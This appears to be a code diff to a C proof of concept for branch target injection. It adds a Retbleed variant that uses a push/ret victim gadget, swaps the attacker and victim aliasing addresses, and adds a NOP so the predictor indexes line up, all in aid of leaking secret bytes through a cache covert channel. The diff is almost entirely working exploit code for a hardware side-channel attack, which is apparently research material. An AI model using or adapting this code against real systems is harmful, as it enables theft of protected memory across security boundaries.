@@ -61,8 +61,8 @@ asm (
 );
 
 /* These two addresses are carefully chosen to alias in the BTB. */
-#define ATTACKER_BRANCH_ADDRESS 0x41bababababf
-#define VICTIM_BRANCH_ADDRESS (0x41bababababf ^ 0x20020000)
+#define VICTIM_BRANCH_ADDRESS 0x41bababababf
+#define ATTACKER_BRANCH_ADDRESS (VICTIM_BRANCH_ADDRESS ^ 0x20020000)
 
 void flush();
 void measure();
@@ -74,17 +74,41 @@ void measure();
 void victim_insns();
 void victim_insns__end();
 asm (
-  ".align 0x80000\n"
+  ".align 0x1000\n"
   "victim_insns:\n"
+#ifdef RETBLEED
+  "push (%r11)\n"
+  "ret\n"
+#else
   "jmp *(%r11)\n"
+#endif
   "victim_insns__end:\n"
 );
+
 
 void attacker_insns();
 void attacker_insns__end();
 asm (
-  ".align 0x80000\n"
+  ".align 0x1000\n"
   "attacker_insns:\n"
+  /* Why the NOP?
+   *
+   * The last byte of the operation is likely used to index
+   * the predictor.
+   *
+   * 0000000000006000 <attacker_insns>:
+   * 6000:       90                      nop
+   * 6001:       41 ff 23                jmp    *(%r11)
+   *
+   * 0000000000005000 <victim_insns>:
+   * 5000:       41 ff 33                push   (%r11)
+   * 5003:       c3                      ret
+   *
+   * The nop put's the last byte of the jmp *(r11) to be at the same offset as the ret.
+   */
+#ifdef RETBLEED
+  "nop\n"
+#endif
   "jmp *(%r11)\n"
   "attacker_insns__end:\n"
 );
@@ -158,7 +182,7 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
         [leak_addr] "r"(dummy),
         [covert_channel] "r"(covert_channel),
         [branch_history] "r" (branch_history),
-        [icall] "r" (VICTIM_BRANCH_ADDRESS)
+        [icall] "r" (ATTACKER_BRANCH_ADDRESS)
       : "rax", "rdi", "rsi", "r11", "rax");
 
       asm("flush:\n");
@@ -193,7 +217,7 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
           [leak_addr] "r"(secret_addr),
           [covert_channel] "r"(covert_channel),
           [branch_history] "r" (branch_history),
-          [icall] "r" (ATTACKER_BRANCH_ADDRESS)
+          [icall] "r" (VICTIM_BRANCH_ADDRESS)
         : "rax", "rdi", "rsi", "r11", "rax");
 
     asm("measure:\n");
